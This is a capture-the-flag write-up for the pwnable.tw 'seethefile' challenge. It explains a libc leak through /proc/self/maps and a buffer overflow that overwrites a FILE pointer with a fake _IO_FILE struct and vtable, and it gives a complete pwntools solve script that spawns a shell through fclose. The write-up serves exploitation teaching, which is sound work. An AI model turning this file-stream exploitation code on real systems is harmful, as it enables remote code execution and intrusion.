# pwnable.tw - seethefile

Original challenge link: https://pwnable.tw/challenge/#9

##  Overview

Quick look into decompiled code shows us we can't directly read flag file from given functions. Upon exit it asks for a name with scanf and "%s", which is vulnerable and leads to buffer overflow, and fp (file pointer) sits directly next to buffer. After we overwrite it, the code calls fclose(fp).

## Exploit

First, we need to leak libc to get access to system function. To do that, we can read `/proc/self/maps` file, which gives us complete address mapping of each segment. This way, we get use the libc base address to get address of system function.

```py
p.sendlineafter(b"see :", b"/proc/self/maps")
p.sendlineafter(b"choice :", b"2")
p.sendlineafter(b"choice :", b"2") ## read next chunk to reach libc info
p.sendlineafter(b"choice :", b"3")
p.recvlines(1) ## skip 1 extra line
libc.address = int(p.recv(8), 16)
```

Since fclose is being passed whatever pointer we overwrite, we can create a fake file structure that gives us a shell when fclose is called on it. You can see more about fclose FSOP in my [notes here](../FSOP%20Notes.md).

We can quickly create a fake _IO_File struct like this - 
```py
nullptr = 0x804b250
base_file_loc = 0x804b284
nullptr = base_file_loc+8
fileStr = FileStructure(null=nullptr)
fileStr.vtable=base_file_loc+152
payload = bytes(fileStr)
payload = b"/bin/sh\x00" + payload[8:]
```
Here, base_file_loc is just the memory address next to fp, which is where we will start writing our payload. nullptr is just a random location in bss which is always null. and the _IO_File is 152 bytes, so, we set vtable to memory address at offset of 152.

We modify the pwntools payload because first few bytes are useless in libc closing logic. so /bin/sh\x00 doesnt affect anything.

Finally we fake a vtable.
```py
jmp_addr = libc.sym['system']
vtable = flat(
    0,    #    size_t __dummy;
    0,    #    size_t __dummy2;
    p32(jmp_addr),    #    _IO_finish_t __finish;
    0,    #    _IO_overflow_t __overflow;
    0,    #    _IO_underflow_t __underflow;
    0,    #    _IO_underflow_t __uflow;
    0,    #    _IO_pbackfail_t __pbackfail;
    0,    #    _IO_xsputn_t __xsputn;
    0,    #    _IO_xsgetn_t __xsgetn;
    0,    #    _IO_seekoff_t __seekoff;
    0,    #    _IO_seekpos_t __seekpos;
    0,    #    _IO_setbuf_t __setbuf;
    0,    #    _IO_sync_t __sync;
    0,    #    _IO_doallocate_t __doallocate;
    0,    #    _IO_read_t __read;
    0,    #    _IO_write_t __write;
    0,    #    _IO_seek_t __seek;
    p32(jmp_addr),    #     _IO_close_t __close;
    0,    #    _IO_stat_t __stat;
    0,    #    _IO_showmanyc_t __showmanyc;
    0,    #    _IO_imbue_t __imbue;
)
```
We are overwriting both __finish and __close because either of them is called depending on flags set (in first 4 bytes of _IO_File, which we overwrote with /bin/sh).

Now what happens is when fclose is called, it will call __close/__finish, with base_file_loc as parameter. We overwrite __close/__finish with system, so now it executes system(base_file_loc), and whats at start of base_file_loc? Our payload /bin/sh!! This way, we get the shell.


## Solve Script
```py
from pwn import *
import time
exe = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']

gdbscript="""break *main+216
c"""

def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10200)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            time.sleep(2)
    return r

p = conn()

## leak libc
p.sendlineafter(b"choice :", b"1")
p.sendlineafter(b"see :", b"/proc/self/maps")
p.sendlineafter(b"choice :", b"2")
p.sendlineafter(b"choice :", b"2") ## read next chunk to reach libc info
p.sendlineafter(b"choice :", b"3")
p.recvlines(1) # change it to recvlines(2) on local.
libc.address = int(p.recv(8), 16)

log.info(f"libc base - {hex(libc.address)}")
log.info(f"system addrr - {hex(libc.sym['system'])}")
p.sendlineafter(b"choice :", b"4")

payload = b""
nullptr = 0x804b250
base_file_loc = 0x804b284
nullptr = base_file_loc+8
fileStr = FileStructure(null=nullptr)
fileStr.vtable=base_file_loc+152
payload = bytes(fileStr)
payload = b"/bin/sh\x00" + payload[8:]

#fake vtable
jmp_addr = libc.sym['system']
vtable = flat(
    0,    #    size_t __dummy;
    0,    #    size_t __dummy2;
    p32(jmp_addr),    #    _IO_finish_t __finish;
    0,    #    _IO_overflow_t __overflow;
    0,    #    _IO_underflow_t __underflow;
    0,    #    _IO_underflow_t __uflow;
    0,    #    _IO_pbackfail_t __pbackfail;
    0,    #    _IO_xsputn_t __xsputn;
    0,    #    _IO_xsgetn_t __xsgetn;
    0,    #    _IO_seekoff_t __seekoff;
    0,    #    _IO_seekpos_t __seekpos;
    0,    #    _IO_setbuf_t __setbuf;
    0,    #    _IO_sync_t __sync;
    0,    #    _IO_doallocate_t __doallocate;
    0,    #    _IO_read_t __read;
    0,    #    _IO_write_t __write;
    0,    #    _IO_seek_t __seek;
    p32(jmp_addr),    #     _IO_close_t __close;
    0,    #    _IO_stat_t __stat;
    0,    #    _IO_showmanyc_t __showmanyc;
    0,    #    _IO_imbue_t __imbue;
)
payload += vtable


##overflow name - 
p.sendlineafter(b"choice :", b"5")

p.sendlineafter(b"name :", flat(
        b"A"*32,   ##  Overflow Name
        p32(base_file_loc), ## Write the location of address next to fp.
        payload  ## write payload next to fp.
    )
)


p.interactive()
```